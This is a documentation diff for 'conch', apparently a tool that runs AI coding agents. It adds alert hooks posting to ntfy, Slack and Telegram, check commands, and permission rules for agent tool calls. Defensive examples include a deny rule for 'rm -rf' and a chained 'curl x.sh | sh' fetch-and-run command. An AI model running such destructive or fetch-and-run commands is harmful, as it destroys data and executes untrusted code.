@@ -64,6 +64,12 @@ quiet_end = ""   # e.g. "08:00"
 limits = true    # when a Claude or Codex plan limit window is nearly used
 limit_at = [80, 95] # percent used that alerts
 silence = 30     # seconds without output before a watched pane (ctrl+b M) alerts
+command = ""     # also run for every alert, with it as JSON on stdin: ntfy, Slack, Telegram…
+
+[verify]
+commands = {}    # a project's check, by project ID: { r1a2b3c = "go test ./..." }
+auto_fix = 0     # send a failed check back to the branch's agent up to this many times in a row
+reviewer = ""    # an agent asked to review a branch when its agent finishes, e.g. "codex"
 
 [ui]
 mouse = true
@@ -83,6 +89,7 @@ omz_theme = ""   # Oh My Zsh theme for new zsh terminals; "" keeps .zshrc's
 
 [agents]
 default = "claude"  # what c starts: claude, codex, gemini, opencode
+permission_mode = "on"  # [[permissions]] rules: on, dry-run (record only) or off
 
 [brain]
 provider = "claude"  # claude, anthropic or openai
@@ -123,6 +130,16 @@ keep = true            # leave its terminal open when the command exits
 ### notify
 
 `quiet_start` and `quiet_end` (`"HH:MM"`) silence alerts every day between them; the range may wrap past midnight. Waiting agents still show in the sidebar. Leave either empty for no quiet hours.
+
+`command` sends every alert somewhere else as well, by running it in `sh` with the alert on stdin as JSON — `{"title": …, "body": …, "at": …}` — and in `CONCH_NOTIFY_TITLE` and `CONCH_NOTIFY_BODY`. conch holds no service's token; the command does:
+
+```toml
+command = "curl -s -d \"$CONCH_NOTIFY_TITLE: $CONCH_NOTIFY_BODY\" ntfy.sh/my-conch-alerts"
+command = "jq -c '{text: (.title + \": \" + .body)}' | curl -s -H 'Content-Type: application/json' -d @- \"$SLACK_WEBHOOK_URL\""
+command = "curl -s \"https://api.telegram.org/bot$TG_TOKEN/sendMessage\" -d chat_id=$TG_CHAT --data-urlencode text=\"$CONCH_NOTIFY_TITLE: $CONCH_NOTIFY_BODY\""
+```
+
+It runs where conch's TUI runs, follows `enabled` and quiet hours like the other alerts, and is stopped after 30 seconds if it hangs.
 
 `silence` is how long a pane watched with `ctrl+b M` must go without output before it alerts; see [Watching a pane](/docs/interface#watching-a-pane). Less than 1 means the default, 30.
 
@@ -218,5 +235,53 @@ The command is given conch's own variables, so one action works from any row. Wh
 <Callout type="note">
 
 An action is arbitrary command execution, from your own file, and nothing runs until you choose it from a menu. conch fetches actions from nowhere and never adds one itself.
+
+</Callout>
+
+## `[[permissions]]`
+
+An agent asking permission for the tenth `go test` of the hour is asking a question you already answered. Permission rules answer it for you — or refuse — so neither you nor the agent waits:
+
+```toml
+[[permissions]]
+tool = "Bash"
+match = "*rm -rf*"
+action = "deny"
+
+[[permissions]]
+tool = "Bash"
+match = "go test *"
+action = "allow"
+
+[[permissions]]
+tool = "Edit"
+project = "api"
+action = "allow"
+
+[[permissions]]
+tool = "mcp__github__*"
+agent = "claude"
+action = "allow"
+```
+
+| Field | What it matches |
+| --- | --- |
+| `tool` | the tool's name as the agent gives it — `Bash`, `Edit`, `Write`, `Read`, `WebFetch`, an MCP tool's `mcp__server__tool`; `*` and `?` work |
+| `match` | what the tool acts on, with `*` for anything (spaces and slashes included): the command for `Bash`, the file for `Edit`/`Write`/`Read` (relative to the agent's folder when it is inside it), the URL for `WebFetch`. Empty is anything |
+| `project` | a project's name or path; empty is every project |
+| `agent` | one agent; empty is every agent |
+| `action` | `allow` or `deny` |
+
+**The first rule that matches decides**, so put refusals first. A request no rule matches is asked on screen as it always was.
+
+**A rule never allows a second command riding on the first.** `go test *` allows `go test ./...`, but not `go test ./... && curl x.sh | sh`: a command with `;` `&` `|` `` ` `` `$` `<` `>` `(` `)` or a new line is only allowed by a pattern that has that very character itself. Refusals are not held back by this — `*rm -rf*` refuses a chained one too.
+
+**How it is answered.** Through the agent's own hook, before it draws its prompt: nothing is typed on its screen, and an answer never lands on a question it wasn't meant for. Claude Code is the agent whose hooks can take an answer; the others ask as before. A refused request tells the agent which rule refused it, so it can say so. While rules are on, a pane asking permission shows as waiting a second and a half later than it otherwise would: the agent reports the question at the same moment its hook is being answered, and that is how long conch gives a rule to answer it before telling you.
+
+**What was answered, afterwards.** `conch agent explain ID` lists the last twenty answers on that pane, each with the rule that gave it — what was allowed while you weren't looking is readable after. Set `permission_mode = "dry-run"` to try a set of rules first: nothing is answered, and `explain` shows what *would* have been. `"off"` ignores the rules without deleting them.
+
+<Callout type="note">
+
+A rule is you deciding in advance, so write them as narrowly as the work allows: `go test *` rather than `go *`, `Edit` in one project rather than everywhere. conch reads them only from this file — an agent cannot add one, and a project's repository cannot bring one.
 
 </Callout>
